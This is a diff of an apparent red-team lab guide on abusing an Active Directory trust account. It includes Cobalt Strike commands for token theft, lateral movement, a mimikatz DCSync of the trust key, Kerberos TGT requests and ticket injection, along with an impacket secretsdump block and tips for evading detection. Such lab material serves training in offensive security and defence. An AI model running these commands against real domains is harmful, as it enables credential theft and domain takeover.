@@ -102,14 +102,19 @@ TDO inter-realm key (DCSync from PARTNER) → authenticate as PARTNER$ to CONTOS
 
 ```
 process_browser
-steal_token <pid>
+steal_token <pid vwebber>
 ```
 
 > **OPSEC-🟠CAUTION** 
  Process injection generates telemetry. Prefer `steal_token <pid>` (no new thread injection) over `inject` if the goal is just token impersonation for the DCSync call.
 
 > ⚠️ **Lateral move to par-dc-1 — `jump scshell64` will fail if `defragsvc` is already running (confirmed 2026-04-29):**
-> scshell modifies the service binary path and then calls `StartService`. Error 1056 (`ERROR_SERVICE_ALREADY_RUNNING`) means scshell ran but can't restart the service to execute the payload. Fall back to `jump winrm64 par-dc-1 smb` which has no service dependency.  
+
+>Jump to Parner Domain Controller:  
+
+```
+jump winrm64 par-dc-1 smb
+```  
 
 5. Use the new Beacon to DCSync the shared inter-realm key from the TDO.
 
@@ -117,24 +122,6 @@ steal_token <pid>
 mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
 ```
 
-⚠️ CONFIRMED: CS `dcsync` CANNOT extract TDO objects (tested 2026-04-29)
-
-`dcsync partner.com PARTNER\CONTOSO$` fails with `ERROR kull_m_rpc_drsr_CrackNames: ERROR_NOT_FOUND`  
-**Why:** CS `dcsync` uses `CrackNames` internally to resolve the target account. TDO objects (`trustedDomain` in `CN=System`) have no `sAMAccountName` — `CrackNames` cannot resolve them. Only mimikatz `/guid:` bypasses `CrackNames` and targets the object directly by GUID.
-
-**OPSEC-safer alternative — impacket-secretsdump via SOCKS (🟠CAUTION, no beacon-thread mimikatz):**
-```cs
-// In beacon on par-dc-1:
-socks 1080 socks5
-```
-```bash
-# Kali Docker — set proxychains then extract LSA secrets (includes trust keys):
-nano /etc/proxychains.conf   # socks5 10.0.0.5 1080
-proxychains impacket-secretsdump PARTNER/vwebber:'[PASS]'@par-dc-1.partner.com -just-dc-ntlm
-```
-> impacket-secretsdump uses its own DCSync implementation and supports TDO extraction without needing GUID resolution via CrackNames. Trust keys appear as `$CONTOSO` in the LSA secrets section of the output.
-
----
 
 OPSEC-🔴UNSAFE (required for CS-only path — no alternative within beacon)
 Performs a DCSync replication request against PARTNER's DC (`/domain:partner.com` targets PARTNER's DC — this is OUR domain). The `/guid:` flag tells mimikatz to replicate the specific TDO object rather than a user account.
@@ -147,13 +134,16 @@ Performs a DCSync replication request against PARTNER's DC (`/domain:partner.com
     >
     > **OPSEC-🔴UNSAFE** — DCSync generates **Event 4662** on PARTNER's DC. Running DCSync against the TDO (rather than a user account) is unusual and may stand out in logs compared to a normal user account DCSync. Use AES256 if available.
     >
-    > ⚠️ **`[Out]` vs `[Out-1]` — ALWAYS use `[Out]` (confirmed 2026-04-29):** The TDO output shows two entries — `[Out]` (current key) and `[Out-1]` (previous rotation key). Using `[Out-1]` rc4 hash causes `krb_asktgt` to fail with **Kerberos error 24** (`KDC_ERR_PREAUTH_FAILED`). Always grab hashes from the `[Out]` block only. Prefer `aes256_hmac` over `rc4_hmac_nt`.
+    > ⚠️ **`[Out]` vs `[Out-1]` — ALWAYS use `[Out]` (confirmed 2026-04-29):** The TDO output shows two entries — `[Out]` (current key) and `[Out-1]` (previous rotation key).  
+Using `[Out-1]` rc4 hash causes `krb_asktgt` to fail with **Kerberos error 24** (`KDC_ERR_PREAUTH_FAILED`).  
+Always grab hashes from the `[Out]` block only. Prefer `aes256_hmac` over `rc4_hmac_nt`.  
 
-6. Request a TGT for the trust account using the shared secret.
+6. Request a TGT for the trust account using the shared secret.  
 
-    ```Beacon-nocolor
-    krb_asktgt /user:PARTNER$ /aes256:[TRUST KEY AES256 from [Out]] /domain:contoso.com /dc:lon-dc-1.contoso.com
-    ```
+```Beacon-nocolor
+krb_asktgt /user:PARTNER$ /aes256:[TRUST KEY AES256 from [Out]] /domain:contoso.com /dc:lon-dc-1.contoso.com
+krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com
+```
 
     > **What this does:** Sends an AS-REQ (Kerberos authentication request) to **CONTOSO's KDC** (`/dc:lon-dc-1.contoso.com` — note this is the FOREIGN domain's DC, not ours) requesting a TGT for the account `PARTNER$` in `contoso.com`.
     >
@@ -171,25 +161,22 @@ Performs a DCSync replication request against PARTNER's DC (`/domain:partner.com
 
     **Step 7a — Create a sacrificial logon session:**
 
-    ```Beacon-nocolor
-    make_token CONTOSO\PARTNER$ FakePassword
-    ```
+```Beacon-nocolor
+make_token CONTOSO\PARTNER$ FakePassword
+```
 
     > Creates a new Type 9 logon session. The password is never validated over the network — it is a placeholder. The session exists purely to hold the injected ticket.
 
     **Step 7b — Decode base64 ticket to .kirbi on attacker desktop:**
 
-    > **IMPORTANT:** `kerberos_ticket_use` expects a **file path to a `.kirbi` file** on the CS client (attacker desktop) — NOT a raw base64 string. Passing base64 directly causes the error: `'C:\Tools\cobaltstrike\client\doIFZD...' does not exist`.
-    >
-    > `kerberos_ticket_use` is the **recommended method** — it uses CS's native ticket injection via Windows API.  
-    > No process spawn, no CLR load, no Rubeus signatures. Rubeus `ptt` via `execute-assembly` is OPSEC-🟠CAUTION spawns a sacrificial process and loads the .NET CLR  
-    > avoid it for pure ticket injection when `kerberos_ticket_use` is available.  
+    > **IMPORTANT:** `kerberos_ticket_use` expects a **file path to a `.kirbi` file** on the CS client (attacker desktop) — NOT a raw base64 string. Passing base64 directly causes the error: `'C:\Tools\cobaltstrike\client\doIFZD...' does not exist`.  
 
-    On attacker desktop PowerShell — decode base64 to .kirbi file:
 
-    ```powershell
-    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\partner.kirbi", [Convert]::FromBase64String("[BASE64_TGT]"))
-    ```
+>On attacker desktop PowerShell — decode base64 to .kirbi file:  
+
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\partner.kirbi", [Convert]::FromBase64String("[BASE64_TGT]"))
+```
 
     Then inject via CS native command:
 
@@ -209,16 +196,6 @@ Performs a DCSync replication request against PARTNER's DC (`/domain:partner.com
     >
     > `PARTNER$` has standard authenticated-user read access to CONTOSO's directory, which is sufficient for:
     > - Reading all user, group, and computer objects
-    > - Finding Kerberoastable accounts (servicePrincipalName set)
-    > - Finding AS-REP roastable accounts (no pre-auth required)
-    > - Mapping group memberships, admin accounts, GPOs
-    > - Identifying further trust relationships FROM CONTOSO
-    >
-    > **OPSEC-🟢SAFE** — LDAP queries from an authenticated account are normal domain behaviour. Generates **Event 1644** only under verbose LDAP logging (not default).
-
-⚠️ In this lab, you have learned how to abuse the trust account to obtain a usable TGT for the foreign domain. These can be used to find potential vulnerabilities, such as Kerberoastable accounts.
-
-===
 
 ## Post-Enumeration — What to Do With CONTOSO Access
 
